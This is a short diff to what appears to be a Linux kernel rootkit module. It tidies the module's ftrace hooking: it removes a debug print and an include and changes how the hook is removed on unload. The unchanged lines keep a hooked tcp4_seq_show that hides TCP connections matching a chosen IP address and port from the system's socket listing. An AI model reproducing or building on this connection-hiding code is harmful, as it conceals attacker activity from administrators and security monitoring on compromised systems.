@@ -1,7 +1,6 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/slab.h>
-#include <linux/ftrace.h>
 #include <net/inet_sock.h>
 #include <net/inet_timewait_sock.h>
 #include "../common/stringify/to_string.h"
@@ -55,7 +54,6 @@ int new_tcp4_seq_show(struct seq_file *seq, void *v) {
     
     char *ipstring = kmalloc(IP_STRING_MAX_LEN, GFP_KERNEL);
     ipaddr_to_string(sk_info.ipaddr, ipstring);
-    pr_info("%p %s:%d", seq, ipstring, sk_info.port);
     if (((ip_to_hide == NULL) && (sk_info.port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (sk_info.port == port_to_hide))) {
         pr_info("Hiding %s : %u", ipstring, sk_info.port);
         kfree(ipstring);
@@ -86,7 +84,7 @@ int load(void) {
  
 void unload(void) {
     pr_info("Shutting down.");
-    unregister_ftrace_function(&hook.ops);
+    remove_hook(&hook);
     pr_info("Goodbye world...");
 }
 
